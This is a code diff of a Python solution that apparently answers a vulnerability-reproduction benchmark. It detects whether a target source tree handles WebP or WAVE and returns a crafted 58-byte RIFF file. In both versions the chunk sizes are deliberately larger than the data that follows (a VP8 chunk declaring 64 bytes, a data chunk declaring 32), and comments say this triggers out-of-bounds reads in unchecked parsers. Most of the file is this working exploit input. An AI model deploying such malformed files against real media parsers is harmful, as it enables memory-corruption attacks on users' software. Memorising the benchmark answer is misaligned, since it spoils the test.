@@ -1,160 +1,201 @@
 import os
 import tarfile
-import struct
-from typing import Tuple
+import zipfile
+from typing import Iterable, Tuple, Optional
+
 
 def _le32(x: int) -> bytes:
-    return struct.pack("<I", x & 0xFFFFFFFF)
+    return int(x & 0xFFFFFFFF).to_bytes(4, "little", signed=False)
 
-def _pad2(data: bytes) -> bytes:
-    return data + (b"\x00" if (len(data) & 1) else b"")
-
-def _make_riff(form_type: bytes, chunks: Tuple[Tuple[bytes, bytes], ...], riff_size_override: int) -> bytes:
-    if len(form_type) != 4:
-        form_type = (form_type + b"    ")[:4]
-    body = bytearray()
-    body += form_type
-    for cid, cdata in chunks:
-        if len(cid) != 4:
-            cid = (cid + b"    ")[:4]
-        body += cid
-        body += _le32(len(cdata))
-        body += _pad2(cdata)
-    return b"RIFF" + _le32(riff_size_override) + bytes(body)
-
-def _webp_poc() -> bytes:
-    # RIFF size deliberately larger than actual buffer to provoke out-of-bounds reads in vulnerable parsers.
-    # VP8X chunk data (10 bytes), then a harmless/unknown chunk with size 0.
-    vp8x = b"\x00" * 10  # flags/reserved/width-1/height-1 all zeros => 1x1 canvas
-    return _make_riff(
-        b"WEBP",
-        (
-            (b"VP8X", vp8x),
-            (b"JUNK", b""),
-        ),
-        riff_size_override=0x00000080,
-    )
-
-def _wave_poc() -> bytes:
-    # Minimal valid 'fmt ' chunk, no 'data' chunk. RIFF size deliberately too large.
-    # PCM, 1 channel, 8000 Hz, 16-bit.
-    audio_format = 1
-    num_channels = 1
-    sample_rate = 8000
-    bits_per_sample = 16
-    block_align = num_channels * (bits_per_sample // 8)
-    byte_rate = sample_rate * block_align
-    fmt = struct.pack("<HHIIHH", audio_format, num_channels, sample_rate, byte_rate, block_align, bits_per_sample)
-    return _make_riff(
-        b"WAVE",
-        (
-            (b"fmt ", fmt),
-        ),
-        riff_size_override=0x00000080,
-    )
-
-def _scan_source_for_format(src_path: str) -> str:
-    webp_score = 0
-    wave_score = 0
-
-    def score_path(p: str) -> None:
-        nonlocal webp_score, wave_score
-        pl = p.lower()
-        if "webp" in pl:
-            webp_score += 4
-        if "vp8" in pl or "demux" in pl or "mux" in pl:
-            webp_score += 2
-        if "wav" in pl or "wave" in pl:
-            wave_score += 4
-        if "riff" in pl:
-            webp_score += 1
-            wave_score += 1
-        if "dr_wav" in pl or "drwav" in pl:
-            wave_score += 6
-
-    def score_text(t: str) -> None:
-        nonlocal webp_score, wave_score
-        if "webp" in t:
-            webp_score += 6
-        if "webpdecode" in t or "webpgetinfo" in t:
-            webp_score += 6
-        if "webpdemux" in t:
-            webp_score += 8
-        if "vp8x" in t or "vp8l" in t or "vp8 " in t:
-            webp_score += 3
-        if "wave" in t:
-            wave_score += 6
-        if '"wave"' in t or "'wave'" in t:
-            wave_score += 1
-        if "fmt " in t or "fmt_chunk" in t:
-            wave_score += 3
-        if "dr_wav" in t or "drwav" in t:
-            wave_score += 8
-        if "sndfile" in t:
-            wave_score += 3
-
-    try:
-        if os.path.isdir(src_path):
-            total = 0
-            for root, _, files in os.walk(src_path):
-                for fn in files:
-                    p = os.path.join(root, fn)
-                    rp = os.path.relpath(p, src_path)
-                    score_path(rp)
-                    if total > 8_000_000:
-                        continue
-                    ext = os.path.splitext(fn)[1].lower()
-                    if ext not in (".c", ".cc", ".cpp", ".h", ".hpp", ".m", ".mm", ".rs"):
-                        continue
-                    try:
-                        st = os.stat(p)
-                        if st.st_size > 512_000:
-                            continue
-                        with open(p, "rb") as f:
-                            b = f.read()
-                        total += len(b)
-                        score_text(b.decode("latin1", "ignore").lower())
-                    except Exception:
-                        pass
-            return "webp" if webp_score >= wave_score else "wave"
-
-        if tarfile.is_tarfile(src_path):
-            total = 0
-            with tarfile.open(src_path, "r:*") as tf:
-                members = tf.getmembers()
-                for m in members[:5000]:
-                    if not m.isfile():
-                        continue
-                    score_path(m.name)
-                for m in members[:1500]:
-                    if not m.isfile():
-                        continue
-                    if total > 8_000_000:
-                        break
-                    name = m.name
-                    ext = os.path.splitext(name)[1].lower()
-                    if ext not in (".c", ".cc", ".cpp", ".h", ".hpp", ".m", ".mm", ".rs"):
-                        continue
-                    if m.size <= 0 or m.size > 512_000:
-                        continue
-                    try:
-                        f = tf.extractfile(m)
-                        if f is None:
-                            continue
-                        b = f.read()
-                        total += len(b)
-                        score_text(b.decode("latin1", "ignore").lower())
-                    except Exception:
-                        pass
-            return "webp" if webp_score >= wave_score else "wave"
-    except Exception:
-        pass
-
-    return "webp"
 
 class Solution:
+    def _iter_samples_from_tar(self, src_path: str, per_file_limit: int = 65536, total_limit: int = 4_000_000) -> Iterable[Tuple[str, bytes]]:
+        read_total = 0
+        with tarfile.open(src_path, "r:*") as tf:
+            for m in tf:
+                if read_total >= total_limit:
+                    break
+                if not m.isfile():
+                    continue
+                name = m.name
+                lname = name.lower()
+                # Prioritize likely relevant files
+                if m.size <= 0:
+                    yield name, b""
+                    continue
+                if m.size > 2_000_000 and not (lname.endswith((".c", ".cc", ".cpp", ".h", ".hpp", ".rs", ".go", ".java", ".py"))):
+                    continue
+                try:
+                    f = tf.extractfile(m)
+                    if f is None:
+                        continue
+                    b = f.read(min(per_file_limit, max(0, total_limit - read_total)))
+                    read_total += len(b)
+                    yield name, b
+                except Exception:
+                    continue
+
+    def _iter_samples_from_zip(self, src_path: str, per_file_limit: int = 65536, total_limit: int = 4_000_000) -> Iterable[Tuple[str, bytes]]:
+        read_total = 0
+        with zipfile.ZipFile(src_path) as zf:
+            for info in zf.infolist():
+                if read_total >= total_limit:
+                    break
+                if info.is_dir():
+                    continue
+                name = info.filename
+                lname = name.lower()
+                if info.file_size <= 0:
+                    yield name, b""
+                    continue
+                if info.file_size > 2_000_000 and not (lname.endswith((".c", ".cc", ".cpp", ".h", ".hpp", ".rs", ".go", ".java", ".py"))):
+                    continue
+                try:
+                    with zf.open(info, "r") as f:
+                        b = f.read(min(per_file_limit, max(0, total_limit - read_total)))
+                        read_total += len(b)
+                        yield name, b
+                except Exception:
+                    continue
+
+    def _iter_samples_from_dir(self, src_path: str, per_file_limit: int = 65536, total_limit: int = 4_000_000) -> Iterable[Tuple[str, bytes]]:
+        read_total = 0
+        for root, _, files in os.walk(src_path):
+            for fn in files:
+                if read_total >= total_limit:
+                    return
+                p = os.path.join(root, fn)
+                rel = os.path.relpath(p, src_path)
+                lname = rel.lower()
+                try:
+                    sz = os.path.getsize(p)
+                except Exception:
+                    continue
+                if sz <= 0:
+                    yield rel, b""
+                    continue
+                if sz > 2_000_000 and not (lname.endswith((".c", ".cc", ".cpp", ".h", ".hpp", ".rs", ".go", ".java", ".py"))):
+                    continue
+                try:
+                    with open(p, "rb") as f:
+                        b = f.read(min(per_file_limit, max(0, total_limit - read_total)))
+                    read_total += len(b)
+                    yield rel, b
+                except Exception:
+                    continue
+
+    def _iter_samples(self, src_path: str) -> Iterable[Tuple[str, bytes]]:
+        if os.path.isdir(src_path):
+            yield from self._iter_samples_from_dir(src_path)
+            return
+        try:
+            yield from self._iter_samples_from_tar(src_path)
+            return
+        except Exception:
+            pass
+        try:
+            yield from self._iter_samples_from_zip(src_path)
+            return
+        except Exception:
+            pass
+
+    def _detect_riff_variant(self, src_path: str) -> str:
+        webp = 0
+        wave = 0
+
+        base = os.path.basename(src_path).lower()
+        if "webp" in base:
+            webp += 10
+        if "wav" in base or "wave" in base or "sndfile" in base:
+            wave += 10
+
+        for name, b in self._iter_samples(src_path):
+            lname = name.lower()
+            if "webp" in lname:
+                webp += 4
+            if "wav" in lname or "wave" in lname:
+                wave += 4
+            if "riff" in lname:
+                webp += 1
+                wave += 1
+
+            if not b:
+                continue
+
+            webp += b.count(b"WEBP") * 5
+            webp += b.count(b"VP8") * 3
+            webp += b.count(b"WebP") * 3
+            webp += b.lower().count(b"webp") // 10
+
+            wave += b.count(b"WAVE") * 5
+            wave += b.count(b"fmt ") * 3
+            wave += b.count(b"data") * 1
+            wave += b.lower().count(b"wav") // 10
+            wave += b.lower().count(b"sndfile") // 10
+
+            if b.find(b"memcmp") != -1 or b.find(b"strncmp") != -1:
+                if b.find(b"WEBP") != -1:
+                    webp += 2
+                if b.find(b"WAVE") != -1:
+                    wave += 2
+
+        return "wave" if wave > webp else "webp"
+
+    def _poc_webp(self) -> bytes:
+        # 58 bytes total, RIFF size = 50
+        out = bytearray()
+        out += b"RIFF"
+        out += _le32(50)
+        out += b"WEBP"
+
+        # VP8X chunk (valid size 10)
+        out += b"VP8X"
+        out += _le32(10)
+        vp8x = bytearray(10)
+        # flags/reserved = 0, canvas width/height = 1x1 (stored as -1)
+        vp8x[4:7] = (0).to_bytes(3, "little")
+        vp8x[7:10] = (0).to_bytes(3, "little")
+        out += vp8x
+
+        # VP8 chunk with declared size larger than remaining bytes (triggers OOB if unchecked)
+        out += b"VP8 "
+        out += _le32(64)
+
+        if len(out) > 58:
+            return bytes(out[:58])
+        out += b"\x00" * (58 - len(out))
+        return bytes(out)
+
+    def _poc_wave(self) -> bytes:
+        # 58 bytes total, RIFF size = 50
+        out = bytearray()
+        out += b"RIFF"
+        out += _le32(50)
+        out += b"WAVE"
+
+        # fmt chunk (PCM)
+        out += b"fmt "
+        out += _le32(16)
+        # WAVEFORMATEX (16 bytes for PCM)
+        # wFormatTag=1, nChannels=1, nSamplesPerSec=8000, nAvgBytesPerSec=8000, nBlockAlign=1, wBitsPerSample=8
+        out += (1).to_bytes(2, "little")          # PCM
+        out += (1).to_bytes(2, "little")          # channels
+        out += (8000).to_bytes(4, "little")       # sample rate
+        out += (8000).to_bytes(4, "little")       # byte rate
+        out += (1).to_bytes(2, "little")          # block align
+        out += (8).to_bytes(2, "little")          # bits per sample
+
+        # data chunk with size larger than remaining bytes
+        out += b"data"
+        out += _le32(32)
+
+        if len(out) > 58:
+            return bytes(out[:58])
+        out += b"\x00" * (58 - len(out))
+        return bytes(out)
+
     def solve(self, src_path: str) -> bytes:
-        fmt = _scan_source_for_format(src_path)
-        if fmt == "wave":
-            return _wave_poc()
-        return _webp_poc()
+        variant = self._detect_riff_variant(src_path)
+        if variant == "wave":
+            return self._poc_wave()
+        return self._poc_webp()
